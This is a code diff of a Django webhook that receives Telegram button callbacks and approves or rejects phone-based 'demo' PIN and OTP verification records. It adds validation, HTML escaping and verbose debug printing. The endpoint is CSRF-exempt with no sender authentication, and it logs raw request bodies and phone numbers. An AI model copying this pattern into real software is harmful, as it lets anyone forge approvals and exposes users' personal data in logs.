@@ -1,3 +1,4 @@
+from html import escape
 import json
 import secrets
 
@@ -364,75 +365,278 @@ def rejected_view(request):
 
 @csrf_exempt
 def telegram_callback_view(request):
+
+    print("========== TELEGRAM CALLBACK ==========")
+    print("METHOD:", request.method)
+    print("BODY:", request.body)
+    print("=======================================")
+
     if request.method != "POST":
-        return JsonResponse({"error": "POST required"}, status=405)
+        return JsonResponse(
+            {"error": "POST required"},
+            status=405
+        )
 
     try:
-        update = json.loads(request.body)
-    except json.JSONDecodeError:
-        return JsonResponse({"error": "Invalid JSON"}, status=400)
+        update = json.loads(request.body.decode("utf-8"))
+
+    except Exception as e:
+        print("JSON ERROR:", e)
+
+        return JsonResponse(
+            {"error": "Invalid JSON"},
+            status=400
+        )
+
+    print("TELEGRAM UPDATE:")
+    print(update)
 
     callback = update.get("callback_query")
+
+    # Telegram may send other types of updates.
     if not callback:
+        print("No callback_query in update")
         return JsonResponse({"ok": True})
 
-    callback_data = callback.get("data", "")
+    callback_id = callback.get("id")
+    callback_data = callback.get("data")
+
+    print("CALLBACK ID:", callback_id)
+    print("CALLBACK DATA:", callback_data)
+
+    if not callback_id:
+        return JsonResponse(
+            {"error": "Missing callback ID"},
+            status=400
+        )
+
+    if not callback_data:
+        answer_callback_query(
+            callback_id,
+            "Invalid button request."
+        )
+
+        return JsonResponse(
+            {"error": "Missing callback data"},
+            status=400
+        )
+
+    # Expected:
+    # approve:123:4
+    # reject:123:4
+
+    parts = callback_data.split(":")
+
+    if len(parts) != 3:
+
+        print("INVALID CALLBACK FORMAT:", parts)
+
+        answer_callback_query(
+            callback_id,
+            "Invalid button data."
+        )
+
+        return JsonResponse(
+            {"error": "Invalid callback data"},
+            status=400
+        )
+
+    action = parts[0]
+    verification_id = parts[1]
+    stage = parts[2]
+
+    print("ACTION:", action)
+    print("VERIFICATION ID:", verification_id)
+    print("STAGE:", stage)
+
+    if action not in ["approve", "reject"]:
+
+        answer_callback_query(
+            callback_id,
+            "Unknown action."
+        )
+
+        return JsonResponse(
+            {"error": "Unknown action"},
+            status=400
+        )
 
     try:
-        parts = callback_data.split(":")
-        action = parts[0]
-        verification_id = int(parts[1])
-        stage = parts[2] if len(parts) > 2 else "4"
-    except (ValueError, AttributeError, IndexError):
-        return JsonResponse({"error": "Invalid callback"}, status=400)
+        verification_id = int(verification_id)
+
+    except ValueError:
+
+        answer_callback_query(
+            callback_id,
+            "Invalid verification ID."
+        )
+
+        return JsonResponse(
+            {"error": "Invalid verification ID"},
+            status=400
+        )
 
     try:
-        verification = DemoVerification.objects.get(id=verification_id)
+        verification = DemoVerification.objects.get(
+            id=verification_id
+        )
+
     except DemoVerification.DoesNotExist:
-        return JsonResponse({"error": "Verification not found"}, status=404)
 
-    stage_text = "PIN Verification" if stage == "4" else "OTP Verification"
+        print(
+            "Verification does not exist:",
+            verification_id
+        )
+
+        answer_callback_query(
+            callback_id,
+            "Verification request no longer exists."
+        )
+
+        return JsonResponse(
+            {"error": "Verification not found"},
+            status=404
+        )
+
+    print(
+        "FOUND VERIFICATION:",
+        verification.id,
+        verification.phone,
+        verification.status
+    )
+
+    # -----------------------------------
+    # APPROVE
+    # -----------------------------------
 
     if action == "approve":
+
         verification.status = "approved"
-        verification.save(update_fields=["status", "updated_at"])
+
+        verification.save(
+            update_fields=[
+                "status",
+                "updated_at"
+            ]
+        )
+
+        print(
+            "VERIFICATION APPROVED:",
+            verification.id
+        )
 
         answer_callback_query(
-            callback["id"],
-            f"Demo verification (stage {stage}) approved.",
+            callback_id,
+            "✅ Demo verification approved."
         )
 
-        edit_telegram_message(
-            callback["message"]["chat"]["id"],
-            callback["message"]["message_id"],
-            (
-                f"🧪 <b>{stage_text}</b>\n\n"
-                f"<b>Phone:</b> {verification.phone}\n"
-                f"<b>Status:</b> ✅ Approved"
-            ),
+        callback_message = callback.get(
+            "message",
+            {}
         )
 
-    elif action == "reject":
+        chat = callback_message.get(
+            "chat",
+            {}
+        )
+
+        chat_id = chat.get("id")
+
+        message_id = callback_message.get(
+            "message_id"
+        )
+
+        print("CHAT ID:", chat_id)
+        print("MESSAGE ID:", message_id)
+
+        if chat_id and message_id:
+
+            new_message = (
+                "<b>🧪 DEMO VERIFICATION</b>\n\n"
+                f"<b>Phone:</b> "
+                f"{escape(str(verification.phone))}\n"
+                f"<b>Request ID:</b> "
+                f"<code>{verification.id}</code>\n"
+                f"<b>Stage:</b> {escape(str(stage))}\n\n"
+                "<b>Status:</b> ✅ APPROVED"
+            )
+
+            edit_telegram_message(
+                chat_id,
+                message_id,
+                new_message
+            )
+
+        return JsonResponse(
+            {"ok": True}
+        )
+
+    # -----------------------------------
+    # REJECT
+    # -----------------------------------
+
+    if action == "reject":
+
         verification.status = "rejected"
-        verification.save(update_fields=["status", "updated_at"])
+
+        verification.save(
+            update_fields=[
+                "status",
+                "updated_at"
+            ]
+        )
+
+        print(
+            "VERIFICATION REJECTED:",
+            verification.id
+        )
 
         answer_callback_query(
-            callback["id"],
-            f"Demo verification (stage {stage}) rejected.",
+            callback_id,
+            "❌ Demo verification rejected."
         )
 
-        edit_telegram_message(
-            callback["message"]["chat"]["id"],
-            callback["message"]["message_id"],
-            (
-                f"🧪 <b>{stage_text}</b>\n\n"
-                f"<b>Phone:</b> {verification.phone}\n"
-                f"<b>Status:</b> ❌ Rejected"
-            ),
+        callback_message = callback.get(
+            "message",
+            {}
         )
 
-    return JsonResponse({"ok": True})
+        chat = callback_message.get(
+            "chat",
+            {}
+        )
 
+        chat_id = chat.get("id")
+
+        message_id = callback_message.get(
+            "message_id"
+        )
+
+        if chat_id and message_id:
+
+            new_message = (
+                "<b>🧪 DEMO VERIFICATION</b>\n\n"
+                f"<b>Phone:</b> "
+                f"{escape(str(verification.phone))}\n"
+                f"<b>Request ID:</b> "
+                f"<code>{verification.id}</code>\n"
+                f"<b>Stage:</b> {escape(str(stage))}\n\n"
+                "<b>Status:</b> ❌ REJECTED"
+            )
+
+            edit_telegram_message(
+                chat_id,
+                message_id,
+                new_message
+            )
+
+        return JsonResponse(
+            {"ok": True}
+        )
+
+    return JsonResponse(
+        {"ok": True}
+    )
 
 # ============================================================
 # SUCCESS
